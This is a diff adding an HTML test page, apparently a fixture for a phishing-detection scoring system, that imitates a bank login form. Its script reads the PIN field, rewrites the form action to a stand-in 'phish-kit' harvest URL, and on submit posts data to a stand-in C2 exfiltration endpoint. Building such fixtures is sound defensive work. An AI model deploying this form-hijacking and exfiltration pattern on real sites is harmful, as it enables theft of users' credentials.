@@ -1,0 +1,70 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>JS Behavior 07 - Multi-Signal Attack</title>
+  <style>
+    body { font-family: sans-serif; padding: 24px; background: #f5f5f5; }
+    h1 { margin-top: 0; }
+    .description { background: #f8d7da; border: 1px solid #dc3545; padding: 12px; border-radius: 4px; margin-bottom: 20px; }
+    form { background: #fff; padding: 20px; border-radius: 8px; border: 1px solid #ddd; max-width: 400px; }
+    label { display: block; margin-bottom: 12px; }
+    input { width: 200px; padding: 4px; }
+    #status { margin-top: 16px; padding: 8px 12px; border-radius: 4px; font-size: 14px; }
+    .waiting { background: #fff3cd; }
+    .phase1 { background: #f8d7da; color: #721c24; }
+    .phase2 { background: #721c24; color: #fff; }
+  </style>
+</head>
+<body>
+  <h1>JS Behavior 07 - Multi-Signal Attack</h1>
+  <div class="description">
+    <strong>Attack scenario:</strong> A sophisticated phishing page combines multiple
+    exfiltration techniques: (1) reads credential value outside submit, (2) changes
+    form action, (3) sends fetch to C2 during submit. This should trigger the
+    multi-signal bonus in NRS scoring.
+    <br><br>
+    <strong>Expected:</strong> Multiple signals fire within 5s, triggering
+    SCORE_MULTIPLE_SIGNALS_BONUS (+10). Combined score should hit or exceed cap (35).
+  </div>
+
+  <form id="login-form" action="/api/login" method="POST">
+    <h3>Bank of Example - Login</h3>
+    <label>Account: <input type="text" name="account" /></label>
+    <label>PIN: <input type="password" id="pin-field" name="pin" value="1234" /></label>
+    <button type="submit" id="submit-btn">Access Account</button>
+  </form>
+
+  <div id="status" class="waiting">Status: Multi-stage attack sequence starting...</div>
+
+  <script>
+    var status = document.getElementById("status");
+
+    // Phase 1: Read credential value (1s after load)
+    setTimeout(function() {
+      var pin = document.getElementById("pin-field").value;
+      status.textContent = "Phase 1: Read PIN value (length=" + pin.length + "). credential-read signal fired.";
+      status.className = "phase1";
+
+      // Phase 2: Change form action (1.5s after load)
+      setTimeout(function() {
+        document.getElementById("login-form").setAttribute(
+          "action", "https://phish-kit.example.com/harvest"
+        );
+        status.textContent += " | Phase 2: Form action changed to attacker domain.";
+      }, 500);
+    }, 1000);
+
+    // Phase 3: On submit, also send fetch to C2
+    document.getElementById("login-form").addEventListener("submit", function(e) {
+      e.preventDefault();
+      fetch("https://c2-server.example.com/exfil", {
+        method: "POST",
+        body: "data=stolen"
+      }).catch(function() {});
+      status.textContent = "Phase 3: All signals fired. Multi-signal bonus should apply.";
+      status.className = "phase2";
+    });
+  </script>
+</body>
+</html>
